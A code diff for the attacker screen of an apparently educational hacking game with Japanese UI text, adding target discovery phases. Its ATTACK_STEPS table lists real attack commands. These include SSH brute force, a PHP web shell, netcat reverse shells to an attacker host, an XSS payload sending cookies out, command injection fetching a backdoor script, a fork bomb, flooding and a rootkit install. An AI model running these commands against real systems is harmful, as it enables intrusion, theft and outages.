@@ -9,7 +9,7 @@ interface AttackerProps {
     socket: Socket | null;
 }
 
-type GamePhase = 'WAITING' | 'IDLE' | 'ATTACKING' | 'ATTACK_SUCCESS' | 'BLOCKED' | 'COMPLETED';
+type GamePhase = 'WAITING' | 'SELECTING_IP' | 'DISCOVERING' | 'IDLE' | 'ATTACKING' | 'ATTACK_SUCCESS' | 'BLOCKED' | 'COMPLETED';
 
 const ATTACKS = [
     { id: 'ssh', name: 'SSHブルートフォース', desc: '辞書攻撃でSSHパスワードを突破' },
@@ -32,23 +32,23 @@ const ATTACKS = [
 ];
 
 const ATTACK_STEPS: Record<string, string[]> = {
-    'ssh': ['nmap 192.168.1.100', 'hydra -l admin -P pass.txt ssh://192.168.1.100', 'ssh admin@192.168.1.100'],
-    'sqli': ['curl http://192.168.1.100/login', 'sqlmap -u "http://192.168.1.100/login?id=1" --dbs', 'sqlmap -u "..." -D public --dump'],
-    'ddos': ['ping -c 1 192.168.1.100', 'slowhttptest -c 1000 -u http://192.168.1.100', 'ab -n 10000 -c 1000 http://192.168.1.100/'],
-    'ransomware': ['msfconsole', 'use exploit/multi/handler', 'exploit -j', 'run ransomware'],
-    'rce': ['nikto -h http://192.168.1.100', 'curl -X POST http://192.168.1.100/upload -d "<?php system($_GET[\'cmd\']); ?>"', 'curl "http://192.168.1.100/upload/shell.php?cmd=nc -e /bin/bash 192.168.1.10 4444"'],
-    'xss': ['curl -X POST http://192.168.1.100/comment -d "<script>fetch(\'http://192.168.1.10/log?cookie=\'+document.cookie)</script>"', 'nc -lvnp 80', 'curl -H "Cookie: session_id=admin_token" http://192.168.1.100/admin'],
-    'oscmd': ['curl "http://192.168.1.100/ping?ip=127.0.0.1;id"', 'curl "http://192.168.1.100/ping?ip=127.0.0.1;wget http://192.168.1.10/bd.sh"', 'curl "http://192.168.1.100/ping?ip=127.0.0.1;bash bd.sh"'],
+    'ssh': ['nmap -p 22 192.168.1.100', 'hydra -l admin -P pass.txt ssh://192.168.1.100', 'ssh admin@192.168.1.100'],
+    'sqli': ['nmap -p 80 192.168.1.100', 'curl http://192.168.1.100/login', 'sqlmap -u "http://192.168.1.100/login?id=1" --dbs', 'sqlmap -u "..." -D public --dump'],
+    'ddos': ['nmap -p 80 192.168.1.100', 'ping -c 1 192.168.1.100', 'slowhttptest -c 1000 -u http://192.168.1.100', 'ab -n 10000 -c 1000 http://192.168.1.100/'],
+    'ransomware': ['nmap -p 22 192.168.1.100', 'hydra -l root -P pass.txt ssh://192.168.1.100', 'ssh root@192.168.1.100', 'wget http://10.0.0.5/ransomware.elf', './ransomware.elf'],
+    'rce': ['nmap -p 80 192.168.1.100', 'nikto -h http://192.168.1.100', 'curl -X POST http://192.168.1.100/upload -d "<?php system($_GET[\'cmd\']); ?>"', 'curl "http://192.168.1.100/upload/shell.php?cmd=nc -e /bin/bash 192.168.1.10 4444"'],
+    'xss': ['nmap -p 80 192.168.1.100', 'curl -X POST http://192.168.1.100/comment -d "<script>fetch(\'http://192.168.1.10/log?cookie=\'+document.cookie)</script>"', 'nc -lvnp 80', 'curl -H "Cookie: session_id=admin_token" http://192.168.1.100/admin'],
+    'oscmd': ['nmap -p 80 192.168.1.100', 'curl "http://192.168.1.100/ping?ip=127.0.0.1;id"', 'curl "http://192.168.1.100/ping?ip=127.0.0.1;wget http://192.168.1.10/bd.sh"', 'curl "http://192.168.1.100/ping?ip=127.0.0.1;bash bd.sh"'],
     'ftp': ['nmap -p 21 192.168.1.100', 'ftp 192.168.1.100', 'put malware.exe', 'site exec malware.exe'],
-    'nmap': ['ssh target@192.168.1.100', 'nmap -sn 10.0.0.0/24', 'nmap -p- 10.0.0.5'],
-    'privesc': ['ssh user@192.168.1.100', 'sudo -l', 'sudo /bin/bash'],
-    'synflood': ['hping3 -S --flood -V -p 80 192.168.1.100'],
-    'dnsamp': ['nmap -sU -p 53 --script=dns-recursion 8.8.8.8', 'hping3 -q -n -a 192.168.1.100 --udp -p 53 8.8.8.8'],
-    'forkbomb': ['ssh user@192.168.1.100', ':(){ :|:& };:'],
+    'nmap': ['nmap -p 22 192.168.1.100', 'hydra -l target -P pass.txt ssh://192.168.1.100', 'ssh target@192.168.1.100', 'nmap -sn 10.0.0.0/24', 'nmap -p- 10.0.0.5'],
+    'privesc': ['nmap -p 22 192.168.1.100', 'hydra -l user -P pass.txt ssh://192.168.1.100', 'ssh user@192.168.1.100', 'sudo -l', 'sudo /bin/bash'],
+    'synflood': ['nmap -p 80 192.168.1.100', 'hping3 -S --flood -V -p 80 192.168.1.100'],
+    'dnsamp': ['nmap -sU -p 53 8.8.8.8', 'nmap -sU -p 53 --script=dns-recursion 8.8.8.8', 'hping3 -q -n -a 192.168.1.100 --udp -p 53 8.8.8.8'],
+    'forkbomb': ['nmap -p 22 192.168.1.100', 'hydra -l user -P pass.txt ssh://192.168.1.100', 'ssh user@192.168.1.100', ':(){ :|:& };:'],
     'slowloris': ['nmap -p 80 192.168.1.100', 'slowloris 192.168.1.100'],
-    'cron': ['ssh root@192.168.1.100', 'echo "* * * * * nc -e /bin/bash 192.168.1.10 4444" > /tmp/cronjob', 'crontab /tmp/cronjob'],
-    'sshkey': ['ssh-keygen -t rsa -f mykey', 'scp mykey.pub root@192.168.1.100:/root/.ssh/authorized_keys'],
-    'rootkit': ['ssh root@192.168.1.100', 'git clone https://github.com/mfontanini/diamorphine', 'cd diamorphine && make', 'insmod diamorphine.ko'],
+    'cron': ['nmap -p 22 192.168.1.100', 'hydra -l root -P pass.txt ssh://192.168.1.100', 'ssh root@192.168.1.100', 'echo "* * * * * nc -e /bin/bash 192.168.1.10 4444" > /tmp/cronjob', 'crontab /tmp/cronjob'],
+    'sshkey': ['nmap -p 22 192.168.1.100', 'ssh-keygen -t rsa -f mykey', 'scp mykey.pub root@192.168.1.100:/root/.ssh/authorized_keys'],
+    'rootkit': ['nmap -p 22 192.168.1.100', 'hydra -l root -P pass.txt ssh://192.168.1.100', 'ssh root@192.168.1.100', 'git clone https://github.com/mfontanini/diamorphine', 'cd diamorphine && make', 'insmod diamorphine.ko'],
 };
 
 export function Attacker({ socket }: AttackerProps) {
@@ -57,7 +57,9 @@ export function Attacker({ socket }: AttackerProps) {
     const roomId = new URLSearchParams(location.search).get('room') || 'UNKNOWN_ROOM';
 
     const [phase, setPhase] = useState<GamePhase>('WAITING');
-    const [target] = useState('192.168.1.100');
+    const [targetIp, setTargetIp] = useState<string>('192.168.1.100');
+    const [availableIps, setAvailableIps] = useState<string[]>([]);
+    const [scanResults, setScanResults] = useState<Record<string, 'scanning' | 'up' | 'down'>>({});
     const [selectedAttack, setSelectedAttack] = useState<string>('ssh');
     const [isBlocked, setIsBlocked] = useState(false);
     const [winner, setWinner] = useState<'attacker' | 'defender' | null>(null);
@@ -136,12 +138,33 @@ export function Attacker({ socket }: AttackerProps) {
 
         socket.on('game_state', (data) => {
             setPhase(data.phase);
+            if (data.availableTargetIps) setAvailableIps(data.availableTargetIps);
+            if (data.targetIp) setTargetIp(data.targetIp);
+
             setIsBlocked(data.phase === 'BLOCKED');
             if (data.phase === 'WAITING') {
                 writeXterm('\r\n[!] ターゲットへの接続待機中...\r\n', '35');
+            } else if (data.phase === 'SELECTING_IP') {
+                writeXterm('\r\n[!] 防御側がターゲットIPを設定しています...\r\n', '35');
+            } else if (data.phase === 'DISCOVERING') {
+                writeXterm('\r\n[!] ターゲットネットワークへの侵入に成功。IPアドレスをスキャンして特定してください。\r\n', '33');
             } else if (data.phase === 'IDLE') {
-                writeXterm('\r\n[!] ターゲットへの経路が確認されました。攻撃を選択してください。\r\n', '32');
+                writeXterm(`\r\n[!] ターゲット(${data.targetIp})への経路が確認されました。攻撃を選択してください。\r\n`, '32');
             }
+        });
+
+        socket.on('scan_result', (data) => {
+            setScanResults(prev => ({ ...prev, [data.ip]: data.success ? 'up' : 'down' }));
+            if (data.success) {
+                writeXterm(`\r\n[+] SCAN SUCCESS: Host ${data.ip} is UP.\r\n`, '32');
+                setTargetIp(data.ip);
+            } else {
+                writeXterm(`\r\n[-] SCAN FAILED: Host ${data.ip} is down or unreachable.\r\n`, '31');
+            }
+        });
+
+        socket.on('start_discovery', (data) => {
+            writeXterm(`\r\n[*] ${data.message}\r\n`, '33');
         });
 
         socket.on('attack_started', (data) => {
@@ -182,6 +205,8 @@ export function Attacker({ socket }: AttackerProps) {
         return () => {
             socket.off('attacker_pty_output');
             socket.off('game_state');
+            socket.off('scan_result');
+            socket.off('start_discovery');
             socket.off('attack_started');
             socket.off('game_clear');
             socket.off('force_logout');
@@ -192,6 +217,12 @@ export function Attacker({ socket }: AttackerProps) {
     }, [socket, phase, roomId, navigate]);
 
     // ─── フェーズごとのアクション ───────────────────────────
+
+    const handleScan = (ip: string) => {
+        if (!socket || phase !== 'DISCOVERING' || scanResults[ip]) return;
+        setScanResults(prev => ({ ...prev, [ip]: 'scanning' }));
+        socket.emit('scan_target_ip', { ip });
+    };
 
     const handleStartAttack = () => {
         if (!socket) return;
@@ -208,28 +239,60 @@ export function Attacker({ socket }: AttackerProps) {
 
     // ─── UI ────────────────────────────────────────────────────
 
-    if (phase === 'WAITING') {
-        return (
-            <div className="min-h-screen bg-[#0a0f12] text-[#00ffcc] font-mono flex flex-col items-center justify-center p-8">
-                <div className="text-2xl mb-4 font-bold animate-pulse text-red-500">ATTACK SQUAD - Waiting for Target</div>
-                <div className="text-slate-400 mb-8">Room: {roomId} に防御側が参加するのを待機しています...</div>
-                <button
-                    onClick={() => navigate('/')}
-                    className="px-6 py-2 border border-red-900/50 bg-red-950/20 hover:bg-red-900/50 text-red-500 rounded transition-colors"
-                >
-                    Leave Room
-                </button>
-            </div>
-        );
-    }
-
     return (
-        <div className="min-h-screen bg-black text-green-400 font-mono flex flex-col">
+        <div className="min-h-screen bg-black text-green-400 font-mono flex flex-col relative w-full h-full">
+            {(phase === 'WAITING' || phase === 'SELECTING_IP') && (
+                <div className="absolute inset-0 bg-[#0a0f12]/95 z-50 text-[#00ffcc] font-mono flex flex-col items-center justify-center p-8 backdrop-blur-sm">
+                    <div className="text-2xl mb-4 font-bold animate-pulse text-red-500">
+                        ATTACK SQUAD - {phase === 'WAITING' ? 'Waiting for Target' : 'Target Setup'}
+                    </div>
+                    <div className="text-slate-400 mb-8">
+                        {phase === 'WAITING' ? `Room: ${roomId} に防御側が参加するのを待機しています...` : '防御側がターゲットIPを設定しています...'}
+                    </div>
+                    <button
+                        onClick={() => navigate('/')}
+                        className="px-6 py-2 border border-red-900/50 bg-red-950/20 hover:bg-red-900/50 text-red-500 rounded transition-colors"
+                    >
+                        Leave Room
+                    </button>
+                </div>
+            )}
+            {phase === 'DISCOVERING' && (
+                <div className="absolute inset-0 top-12 bg-black/95 z-40 text-green-400 font-mono flex flex-col items-center justify-center p-8 backdrop-blur-md">
+                    <div className="text-2xl mb-4 font-bold text-green-500">TARGET DISCOVERY</div>
+                    <div className="text-slate-400 mb-8 max-w-2xl text-center">
+                        ターゲットネットワークへの境界侵入に成功しました。<br />
+                        以下のIPアドレスをスキャンし、ターゲットサーバー（防御側）を特定してください。
+                    </div>
+                    <div className="grid grid-cols-2 md:grid-cols-5 gap-4 max-w-4xl w-full">
+                        {availableIps.map(ip => (
+                            <button
+                                key={ip}
+                                onClick={() => handleScan(ip)}
+                                disabled={scanResults[ip] === 'scanning' || scanResults[ip] === 'up'}
+                                className={`px-4 py-6 border rounded font-mono transition-all flex flex-col items-center justify-center shadow-lg hover:-translate-y-1 ${scanResults[ip] === 'up'
+                                        ? 'bg-green-900 border-green-500 text-green-300'
+                                        : scanResults[ip] === 'down'
+                                            ? 'bg-red-950/30 border-red-900/50 text-slate-500 line-through opacity-70'
+                                            : scanResults[ip] === 'scanning'
+                                                ? 'bg-yellow-950 border-yellow-700 text-yellow-500 animate-pulse'
+                                                : 'bg-slate-900 border-slate-700 hover:border-green-500 text-green-500 hover:bg-slate-800'
+                                    }`}
+                            >
+                                <span className={scanResults[ip] === 'up' ? 'font-bold' : ''}>{ip}</span>
+                                {scanResults[ip] === 'scanning' && <span className="text-[10px] mt-2 tracking-widest text-yellow-500">SCANNING</span>}
+                                {scanResults[ip] === 'up' && <span className="text-[10px] mt-2 font-bold animate-pulse text-green-300 tracking-wider">TARGET FOUND</span>}
+                                {scanResults[ip] === 'down' && <span className="text-[10px] mt-2 text-slate-600 tracking-wider">OFFLINE</span>}
+                            </button>
+                        ))}
+                    </div>
+                </div>
+            )}
             {/* ヘッダー */}
             <div className="flex items-center justify-between px-4 py-2 bg-slate-900 border-b border-green-900/50">
                 <div className="flex items-center gap-3">
                     <span className="text-red-500 font-bold">▶ attacker@kali</span>
-                    <span className="text-slate-500 text-xs">192.168.50.10</span>
+                    <span className="text-slate-500 text-xs">10.0.0.5</span>
                     <span className={`text-xs px-2 py-0.5 rounded-full font-bold ${isBlocked ? 'bg-red-900 text-red-300' :
                         phase === 'COMPLETED' ? (winner === 'attacker' ? 'bg-green-900 text-green-300' : 'bg-red-900 text-red-300') :
                             phase !== 'IDLE' ? 'bg-yellow-900 text-yellow-300 animate-pulse' :
@@ -302,12 +365,15 @@ export function Attacker({ socket }: AttackerProps) {
                                         以下のコマンドを順番にターミナルに入力し、防衛側より早く攻撃を完了させてください！
                                     </div>
                                     <div className="space-y-2">
-                                        {ATTACK_STEPS[selectedAttack]?.map((cmd, i) => (
-                                            <div key={i} className="bg-black border border-slate-800 p-2 rounded relative group">
-                                                <div className="text-slate-500 text-[9px] mb-1">Step {i + 1}</div>
-                                                <code className="text-green-400 text-[10px] break-all">{cmd}</code>
-                                            </div>
-                                        ))}
+                                        {ATTACK_STEPS[selectedAttack]?.map((cmd, i) => {
+                                            const actualCmd = cmd.replace(/192\.168\.1\.100/g, targetIp);
+                                            return (
+                                                <div key={i} className="bg-black border border-slate-800 p-2 rounded relative group">
+                                                    <div className="text-slate-500 text-[9px] mb-1">Step {i + 1}</div>
+                                                    <code className="text-green-400 text-[10px] break-all">{actualCmd}</code>
+                                                </div>
+                                            );
+                                        })}
                                     </div>
                                 </div>
                             )}
@@ -322,8 +388,8 @@ export function Attacker({ socket }: AttackerProps) {
 
                     {/* ターゲット情報 */}
                     <div className="p-3 border-t border-slate-800 text-xs text-slate-500 space-y-1">
-                        <div>Target: <span className="text-green-500">{target}</span></div>
-                        <div>Port: <span className="text-green-500">22/ssh</span></div>
+                        <div>Target: <span className="text-green-500">{phase === 'WAITING' || phase === 'SELECTING_IP' || phase === 'DISCOVERING' ? '???' : targetIp}</span></div>
+                        <div>Port: <span className="text-green-500">22/ssh, 80/http</span></div>
                     </div>
                 </div>
             </div>
